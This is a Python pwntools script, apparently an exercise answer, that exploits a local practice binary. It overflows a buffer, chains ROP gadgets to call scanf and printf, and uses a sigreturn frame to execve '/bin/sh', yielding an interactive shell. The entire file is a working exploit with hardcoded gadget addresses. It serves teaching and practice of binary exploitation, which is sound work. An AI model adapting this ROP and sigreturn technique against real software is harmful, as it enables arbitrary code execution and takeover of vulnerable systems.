#!/usr/bin/python -i

# answer to Chap2. Q2 (b)
from pwn import *

r = process('./answer')

gdb.attach(r)

syscall_gadget = 0x400613

pop_rdi = 0x4006a3
ret = 0x4006a4
pop_rsi_r15 = 0x4006a1

scanf_plt = 0x4004a0
printf_plt = 0x400480

fmtstr = 0x4006d3
writeable_pos = 0x601100

execve_arg1 = writeable_pos
execve_arg2 = writeable_pos + 8

len15str = 0x400244

p = cyclic(24)

# sigreturn


def rop_call(rip=0, rdi=0, rsi=0):
    p = ''
    p += p64(pop_rdi)
    p += p64(rdi)
    p += p64(pop_rsi_r15)
    p += p64(rsi)
    p += p64(0xdeadbeeffeedbeef)
    p += p64(rip)
    return p


def scanf_call(rdi=0, rsi=0):
    return rop_call(scanf_plt, rdi, rsi)


p += scanf_call(fmtstr, writeable_pos)
p += p64(pop_rdi)
p += p64(len15str)
p += p64(ret)  # align padding
p += p64(printf_plt)
p += p64(syscall_gadget)

context.arch = 'amd64'

frame = SigreturnFrame()
frame.rip = syscall_gadget
frame.rax = 59
frame.rdi = execve_arg1
frame.rsi = execve_arg2
frame.rdx = 0

sr = ''  # sigreturn rop gadget

sr += str(frame)

srf_len=len(sr)

p += sr

raw_input('first payload    ->')

r.send(p + '\n')

raw_input('second payload   ->')

p = ''
p += '/bin/sh\0'
p += p64(writeable_pos)
p += p64(0)

r.send(p + '\n')

r.interactive()
